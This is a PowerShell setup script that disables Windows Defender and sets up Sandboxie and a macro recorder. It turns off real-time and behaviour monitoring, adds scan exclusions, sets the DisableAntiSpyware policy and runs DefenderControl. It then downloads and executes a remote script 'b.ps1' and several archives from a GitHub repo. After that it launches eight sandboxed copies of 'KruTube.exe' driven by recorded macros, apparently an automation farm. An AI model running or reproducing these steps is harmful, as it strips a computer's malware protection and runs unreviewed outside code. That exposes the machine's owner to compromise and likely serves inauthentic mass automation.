$fileNumber = Read-Host -Prompt "Enter the number of the file you want to open (1 to 40)"
$pagefile = Get-WmiObject Win32_ComputerSystem -EnableAllPrivileges
$pagefile.AutomaticManagedPagefile = $false
$pagefile.put() | Out-Null
$pagefileset = Get-WmiObject Win32_PageFileSetting
$pagefileset.InitialSize = 90024
$pagefileset.MaximumSize = 90048
$pagefileset.Put() | Out-Null
Add-MpPreference -ExclusionPath "C:\Program Files (x86)\DefenderControl\dControl.exe"
Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop\*"
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableScanningNetworkFiles $true
Set-MpPreference -SubmitSamplesConsent 2
powercfg /setactive e9a42b02-d5df-448d-aa00-03f14749eb61
$zipUrl = "https://raw.githubusercontent.com/user009dm/new/main/sordum.zip"

# Define the path where the ZIP file will be saved
$zipFilePath = "$env:USERPROFILE\Desktop\sordum.zip"
$extractPath = "$env:USERPROFILE\Desktop"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force
Start-Process -FilePath "$extractPath\dControl.exe"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -Force
Invoke-WebRequest -Uri "https://bits.avcdn.net/productfamily_VPN/insttype_PRO/platform_WIN/installertype_ONLINE/build_RELEASE/cookie_mmm_scl_998_999_000_m:dlid_SLN-TRIAL-ONLINE-PP?alt=en-us" -OutFile "$env:USERPROFILE\Desktop\avast.exe"
Start-Process -FilePath "$extractPath\avast.exe"

Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/user009dm/new/main/b.ps1' -OutFile "$env:USERPROFILE\Desktop\b.ps1"
$scriptPathss = "$env:USERPROFILE\Desktop\b.ps1"
Start-Process powershell -ArgumentList "-File `"$scriptPathss`""

for ($i = 1; $i -le 40; $i++) {
    $fileUrl = "https://raw.githubusercontent.com/user009dm/new/main/$i.mrf"
    $filePath = "$env:USERPROFILE\Desktop\$i.mrf"
    Invoke-WebRequest -Uri $fileUrl -OutFile $filePath
}

 
Invoke-WebRequest -Uri "https://www.macrorecorder.com/MacroRecorder_Portable.zip" -OutFile "$env:USERPROFILE\Desktop\MacroRecorder_Portable.zip"
Expand-Archive -Path "$env:USERPROFILE\Desktop\MacroRecorder_Portable.zip" -DestinationPath "$env:USERPROFILE\Desktop"
taskkill /f /im OneDrive.exe

Invoke-WebRequest -Uri "https://github.com/user009dm/new/raw/main/Sandboxie-new.zip" -OutFile "$env:USERPROFILE\Desktop\Sandboxie-new.zip"
Expand-Archive -Path "$env:USERPROFILE\Desktop\Sandboxie-new.zip" -DestinationPath "$env:USERPROFILE\Desktop"
Start-Process -FilePath "$env:USERPROFILE\Desktop\Sandboxie\SandMan.exe"
Start-Service -Name "audiosrv"
Write-Host "Press any key to continue..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
Set-Location -Path "$env:USERPROFILE\Desktop\Sandboxie\"
for ($i = 1; $i -le 8; $i++) {
    # Configure Sandboxie box
    & "$env:USERPROFILE\Desktop\Sandboxie\sbieini.exe" set $i "Enabled y"
    & "$env:USERPROFILE\Desktop\Sandboxie\sbieini.exe" set $i "AutoRecover n"
    & "$env:USERPROFILE\Desktop\Sandboxie\sbieini.exe" set $i "BorderColor #00FFFF,ttl,6"
    & "$env:USERPROFILE\Desktop\Sandboxie\sbieini.exe" set $i "BoxNameTitle y"
    Start-Process -FilePath "Start.exe" -ArgumentList "/box:$i `"$env:USERPROFILE\Desktop\KruTube\KruTube.exe`"" -WindowStyle Maximized
}

$chosenFilePath = "$env:USERPROFILE\Desktop\$fileNumber.mrf"
$macroRecorderPath = "$env:USERPROFILE\Desktop\MacroRecorder\MacroRecorder.exe"
Start-Process -FilePath $macroRecorderPath -ArgumentList "-open=`"$chosenFilePath`""

exit

